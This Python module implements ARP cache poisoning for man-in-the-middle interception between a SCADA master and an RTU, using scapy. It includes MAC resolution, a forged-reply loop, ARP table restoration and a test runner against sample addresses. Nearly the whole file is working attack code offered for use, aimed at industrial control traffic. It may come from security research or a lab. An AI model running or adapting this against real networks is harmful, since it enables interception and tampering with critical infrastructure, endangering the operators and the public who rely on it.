"""
ARP Spoofing Module for MiTM Attacks

Implements ARP cache poisoning to intercept traffic between SCADA master and RTU.
Tricks both nodes into mapping each other's IP addresses to the attacker's MAC address.
"""

import asyncio
import logging
import time
from typing import Optional
import socket
import threading

# Try to import scapy, fall back to mock implementation if not available
try:
    from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, get_if_addr
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available. ARP spoofing will use mock implementation.")

logger = logging.getLogger(__name__)

class ARPSpoofer:
    """
    ARP spoofing implementation for intercepting traffic between targets.
    """
    
    def __init__(self, interface: str = "eth0"):
        """
        Initialize ARP spoofer.
        
        Args:
            interface: Network interface to use for spoofing
        """
        self.interface = interface
        self.is_spoofing = False
        self.spoof_task: Optional[asyncio.Task] = None
        self.target1_ip: Optional[str] = None
        self.target2_ip: Optional[str] = None
        self.attacker_mac = self._get_attacker_mac()
        
        logger.info(f"ARP Spoofer initialized on interface {interface}")
        logger.info(f"Attacker MAC: {self.attacker_mac}")
    
    def _get_attacker_mac(self) -> str:
        """Get the attacker's MAC address."""
        if SCAPY_AVAILABLE:
            try:
                return get_if_hwaddr(self.interface)
            except:
                pass
        
        # Mock MAC address for testing
        return "00:11:22:33:44:55"
    
    def _get_target_mac(self, target_ip: str) -> str:
        """
        Get MAC address of target IP using ARP request.
        
        Args:
            target_ip: IP address to resolve
            
        Returns:
            MAC address of target
        """
        if SCAPY_AVAILABLE:
            try:
                # Send ARP request to get target MAC
                arp_request = ARP(pdst=target_ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                arp_request_broadcast = broadcast / arp_request
                answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
                
                if answered_list:
                    return answered_list[0][1].hwsrc
            except Exception as e:
                logger.error(f"Failed to get MAC for {target_ip}: {e}")
        
        # Mock MAC addresses for testing
        mac_mapping = {
            "192.168.1.100": "aa:bb:cc:dd:ee:ff",  # SCADA Master
            "192.168.1.10": "11:22:33:44:55:66",   # RTU
            "192.168.1.101": "77:88:99:aa:bb:cc"   # Additional RTU
        }
        return mac_mapping.get(target_ip, "ff:ff:ff:ff:ff:ff")
    
    async def start_spoofing(self, target1_ip: str, target2_ip: str):
        """
        Start ARP spoofing between two targets.
        
        Args:
            target1_ip: First target IP (typically SCADA master)
            target2_ip: Second target IP (typically RTU)
        """
        if self.is_spoofing:
            logger.warning("ARP spoofing already in progress")
            return
        
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.is_spoofing = True
        
        # Get target MAC addresses
        target1_mac = self._get_target_mac(target1_ip)
        target2_mac = self._get_target_mac(target2_ip)
        
        logger.info(f"Starting ARP spoofing: {target1_ip} <-> {target2_ip}")
        logger.info(f"Target MACs: {target1_ip}={target1_mac}, {target2_ip}={target2_mac}")
        
        # Start spoofing task
        self.spoof_task = asyncio.create_task(
            self._spoof_loop(target1_ip, target2_ip, target1_mac, target2_mac)
        )
        
        logger.info("ARP spoofing started successfully")
    
    async def stop_spoofing(self):
        """Stop ARP spoofing and restore original ARP tables."""
        if not self.is_spoofing:
            logger.warning("ARP spoofing is not active")
            return
        
        self.is_spoofing = False
        
        if self.spoof_task:
            self.spoof_task.cancel()
            try:
                await self.spoof_task
            except asyncio.CancelledError:
                pass
        
        # Restore original ARP entries
        if self.target1_ip and self.target2_ip:
            await self._restore_arp_tables()
        
        logger.info("ARP spoofing stopped and ARP tables restored")
    
    async def _spoof_loop(self, target1_ip: str, target2_ip: str, 
                         target1_mac: str, target2_mac: str):
        """
        Main spoofing loop that continuously sends ARP responses.
        
        Args:
            target1_ip: First target IP
            target2_ip: Second target IP
            target1_mac: First target MAC
            target2_mac: Second target MAC
        """
        packet_count = 0
        
        try:
            while self.is_spoofing:
                # Tell target1 that we are target2 (target2_ip -> our MAC)
                await self._send_arp_response(target1_ip, target2_ip, target1_mac)
                
                # Tell target2 that we are target1 (target1_ip -> our MAC)
                await self._send_arp_response(target2_ip, target1_ip, target2_mac)
                
                packet_count += 2
                
                if packet_count % 20 == 0:  # Log every 10 rounds
                    logger.debug(f"ARP spoofing: sent {packet_count} packets")
                
                # Wait 2 seconds before next round
                await asyncio.sleep(2)
                
        except asyncio.CancelledError:
            logger.info("ARP spoofing loop cancelled")
            raise
        except Exception as e:
            logger.error(f"Error in ARP spoofing loop: {e}")
    
    async def _send_arp_response(self, target_ip: str, spoof_ip: str, target_mac: str):
        """
        Send ARP response to poison target's ARP cache.
        
        Args:
            target_ip: IP of the target to poison
            spoof_ip: IP we're claiming to be
            target_mac: MAC address of target
        """
        if SCAPY_AVAILABLE:
            try:
                # Create ARP response packet
                arp_response = ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoof_ip,
                    hwsrc=self.attacker_mac
                )
                
                # Send the packet
                send(arp_response, verbose=False)
                
            except Exception as e:
                logger.error(f"Failed to send ARP packet: {e}")
        else:
            # Mock implementation - just log what would be sent
            logger.debug(f"MOCK ARP: {target_ip} <- {spoof_ip} is at {self.attacker_mac}")
    
    async def _restore_arp_tables(self):
        """Restore original ARP table entries for targets."""
        if not (self.target1_ip and self.target2_ip):
            return
        
        # Get original MAC addresses
        target1_mac = self._get_target_mac(self.target1_ip)
        target2_mac = self._get_target_mac(self.target2_ip)
        
        if SCAPY_AVAILABLE:
            try:
                # Send correct ARP responses to restore tables
                for _ in range(5):  # Send multiple times to ensure restoration
                    # Restore target1's view of target2
                    arp1 = ARP(
                        op=2,
                        pdst=self.target1_ip,
                        hwdst=target1_mac,
                        psrc=self.target2_ip,
                        hwsrc=target2_mac
                    )
                    
                    # Restore target2's view of target1
                    arp2 = ARP(
                        op=2,
                        pdst=self.target2_ip,
                        hwdst=target2_mac,
                        psrc=self.target1_ip,
                        hwsrc=target1_mac
                    )
                    
                    send(arp1, verbose=False)
                    send(arp2, verbose=False)
                    
                    await asyncio.sleep(0.5)
                    
            except Exception as e:
                logger.error(f"Failed to restore ARP tables: {e}")
        
        logger.info("ARP table restoration completed")
    
    def get_status(self) -> dict:
        """Get current spoofing status."""
        return {
            'is_spoofing': self.is_spoofing,
            'interface': self.interface,
            'attacker_mac': self.attacker_mac,
            'target1_ip': self.target1_ip,
            'target2_ip': self.target2_ip,
            'scapy_available': SCAPY_AVAILABLE
        }

# Test function
async def test_arp_spoof():
    """Test the ARP spoofing functionality."""
    spoofer = ARPSpoofer("eth0")
    
    print("Testing ARP spoofing...")
    await spoofer.start_spoofing("192.168.1.100", "192.168.1.10")
    
    # Run for 10 seconds
    await asyncio.sleep(10)
    
    await spoofer.stop_spoofing()
    print("ARP spoofing test completed")

if __name__ == "__main__":
    asyncio.run(test_arp_spoof())
